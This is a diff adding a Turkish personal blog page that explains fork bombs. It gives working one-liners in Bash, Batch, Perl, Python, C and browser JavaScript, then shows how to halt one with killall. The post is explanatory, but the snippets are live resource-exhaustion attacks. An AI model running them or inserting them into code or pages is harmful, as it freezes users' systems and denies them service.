@@ -1,0 +1,220 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en-us">
+
+  <head>
+  <link href="http://gmpg.org/xfn/11" rel="profile">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+
+  <!-- Enable responsiveness on mobile devices-->
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+
+  <title>
+    
+      Fork Bombasi &middot; Mehmet Başal
+    
+  </title>
+
+  <!-- CSS -->
+  <link rel="stylesheet" href="/public/css/poole.css">
+  <link rel="stylesheet" href="/public/css/syntax.css">
+  <link rel="stylesheet" href="/public/css/hyde.css">
+  <link rel="stylesheet" href="http://fonts.googleapis.com/css?family=PT+Sans:400,400italic,700|Abril+Fatface">
+
+  <!-- Icons -->
+  <link rel="apple-touch-icon-precomposed" sizes="144x144" href="/public/apple-touch-icon-144-precomposed.png">
+                                 <link rel="shortcut icon" href="/public/favicon.ico">
+
+  <!-- RSS -->
+  <link rel="alternate" type="application/rss+xml" title="RSS" href="/atom.xml">
+</head>
+
+
+  <body>
+
+    
+<div class="sidebar">
+  <div class="container sidebar-sticky">
+  <center>
+    <header class="sidebar-header" role="banner">
+      <a href="/">
+	<img src="/images/profile.jpg" class="img-circle" 
+	  weight="200" height="200" />
+      </a>
+    </header>
+  </center>
+    <div class="sidebar-about">
+      <h1>
+        <a href="/">
+          Mehmet Başal
+        </a>
+      </h1>
+      <p class="lead">Başta Android OS olmak üzere çeşitli ortamlar için yazılım geliştiren, işssiz bir Bilgisayar Mühendisi.</p>
+    </div>
+
+    <nav class="sidebar-nav">
+      <a class="sidebar-nav-item" href="/">Anasayfa</a>
+      <a href="http://mhmtbsl.net/fo">Sunumlar</a>
+      
+
+      
+      
+        
+          
+        
+      
+        
+          
+            <a class="sidebar-nav-item" href="/about/">Hakkında</a>
+          
+        
+      
+        
+      
+        
+          
+        
+      
+        
+          
+        
+      
+        
+          
+        
+      
+    </nav>
+
+      <div class="soc">
+    <a href="http://twitter.com/p4s4li" >
+      <div class="social">&#62217;</div></a>
+    <a href="https://github.com/pasali">
+	<div class="social">&#62208;</div></a>
+     <a href="http://facebook.com/mhmtbsl53" >
+       <div class="social">&#62220;</div></a>
+    <a href="https://linkedin.com/in/pasali">
+      <div class="social">&#62232;</div></a>
+
+</div>
+
+    <p>&copy; 2014. All rights reserved.</p>
+  </div>
+</div>
+
+
+    <div class="content container">
+      <div class="post">
+  <h1 class="post-title">Fork Bombasi</h1>
+  <span class="post-date">26 Sep 2013</span>
+  <p>Fork bombası, bir prosesin kendini sürekli kopyalarak kullanılarbilir sistem kaynaklarını sömürmesi durumudur.
+CPU ve RAM’i meşgul ederek bilgisayarınızın donmasına neden olur. </p>
+
+<h1>Fork Bombası Nasıl Yapılır ?</h1>
+
+<p>Unix türevi bir işletim sistemi kullanıyorsanız, fork sistem çağrısını kullanararak bir fork bombası yapabilirsiniz.&lt;!-- more --&gt;
+fork fonksiyonu bulunduğu prosesin bir kopyasını oluşturur. exec fonksiyonu ilede o kopya prosese isteğiniz bir programı gömebilirsiniz.
+Eğer siz fonksiyonu sonsuz döngüye sokup sürekli kendini kopyalamasını sağlarsınız elinizde nur topu gibi bir fork bombanız olur.
+Çeşitli dillerde gerçekleme yapabilirsiniz. Bir kaç örnek vermek gerekirse:</p>
+
+<h2>Bash</h2>
+<div class="highlight"><pre><code class="language-bash" data-lang="bash">:<span class="o">(){</span> :<span class="p">|</span>:<span class="p">&amp;</span> <span class="o">}</span><span class="p">;</span>:
+</code></pre></div>
+<h2>Windows Batch</h2>
+<div class="highlight"><pre><code class="language-bash" data-lang="bash">:s
+start <span class="s2">&quot;&quot;</span> %0
+goto s
+</code></pre></div>
+<h2>Perl</h2>
+<div class="highlight"><pre><code class="language-perl" data-lang="perl"><span class="n">perl</span> <span class="o">-</span><span class="n">e</span> <span class="s">&quot;fork while fork&quot;</span> <span class="o">&amp;</span>
+</code></pre></div>
+<h2>Pyhton</h2>
+<div class="highlight"><pre><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">os</span>
+<span class="k">while</span> <span class="n">os</span><span class="o">.</span><span class="n">fork</span><span class="p">()</span> <span class="ow">or</span> <span class="bp">True</span><span class="p">:</span> <span class="n">os</span><span class="o">.</span><span class="n">fork</span><span class="p">()</span>
+</code></pre></div>
+<h2>C</h2>
+<div class="highlight"><pre><code class="language-c" data-lang="c"><span class="cp">#include &lt;unistd.h&gt;</span>
+<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
+<span class="p">{</span>
+    <span class="k">while</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+    <span class="n">fork</span><span class="p">();</span>
+<span class="p">}</span>
+</code></pre></div>
+<h2>Javascript</h2>
+<div class="highlight"><pre><code class="language-javascript" data-lang="javascript"><span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span>
+     <span class="k">while</span> <span class="p">(</span><span class="kc">true</span><span class="p">)</span> <span class="p">{</span>
+     <span class="kd">var</span> <span class="nx">w</span> <span class="o">=</span> <span class="nb">window</span><span class="p">.</span><span class="nx">open</span><span class="p">();</span>
+     <span class="nx">w</span><span class="p">.</span><span class="nb">document</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nx">documentElement</span><span class="p">.</span><span class="nx">outerHTML</span><span class="o">||</span><span class="nb">document</span><span class="p">.</span><span class="nx">documentElement</span><span class="p">.</span><span class="nx">innerHTML</span><span class="p">);</span>
+     <span class="p">}</span>
+<span class="o">&lt;</span><span class="err">/script&gt;</span>
+</code></pre></div>
+<h2>Etkisiz Hale Getirme</h2>
+
+<p>Yapıları yüzünden fork bombaları çalışmaya başlayınca durdurması zordur. Eğer şanslıysanız PID’ler bitmeden durdurabilirsiniz. Örnek olarak bash scripti alalım:</p>
+<div class="highlight"><pre><code class="language-bash" data-lang="bash">bomb<span class="o">()</span> <span class="o">{</span>
+    bomb <span class="p">|</span> bomb <span class="p">&amp;</span>
+<span class="o">}</span><span class="p">;</span>
+bomb
+</code></pre></div>
+<p>Yukardaki betik öz yineli şekilde kendi kopyasını üretiyor ve ampersan operatöründen dolayı bunu arka planda yapıyor. Eğer prosesin adını biliyorsak önce dondurup sonra da bütün çocuk ve ebeveyn prosesleri öldürürüz yani:</p>
+<div class="highlight"><pre><code class="language-text" data-lang="text">killall -STOP prosesAdi
+killall -KILL prosesAdi
+</code></pre></div>
+<p>Eğer boş PID kalmamışsa bombayı durdurmak için en az bir shell açık olmalıdır. Unix tabanlı sistemlerde her prosesin bir PIDsi vardır. Ama bu sınırlı bir rakamdır. Fork bombası PIDleri doldurursa onu durdurmak içim bir shell açamazsınız daha doğrusu yeni bir proses oluşturamazsınız. Bu durumda en az bir shell açık olmalıdır.
+kaynak:wikipedia</p>
+
+</div>
+
+<div id="disqus_thread"></div>
+    <script type="text/javascript">
+        /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
+	var disqus_shortname = 'mhmtbsl'; // required: replace example with your 
+
+        /* * * DON'T EDIT BELOW THIS LINE * * */
+        (function() {
+            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        })();
+    </script>
+    <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+    <a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+
+
+<div class="related">
+  <h2>Benzer Yazılar</h2>
+  <ul class="related-posts">
+    
+      <li>
+        <h3>
+          <a href="/2014/02/12/android-asynctask-kullanimi/">
+            Android - AsyncTask Kullanımı
+            <small>12 Feb 2014</small>
+          </a>
+        </h3>
+      </li>
+    
+      <li>
+        <h3>
+          <a href="/android/notification/bildirim/olu%C5%9Fturma/2014/01/31/android-bildirim-notification-olusturma/">
+            Android - Bildirim(Notification) Oluşturma
+            <small>31 Jan 2014</small>
+          </a>
+        </h3>
+      </li>
+    
+      <li>
+        <h3>
+          <a href="/2014/01/30/android-sunucuya-terminalden-baglanma/">
+            Android Sunucuya Terminalden Bağlanma
+            <small>30 Jan 2014</small>
+          </a>
+        </h3>
+      </li>
+    
+  </ul>
+</div>
+
+    </div>
+
+  </body>
+</html>
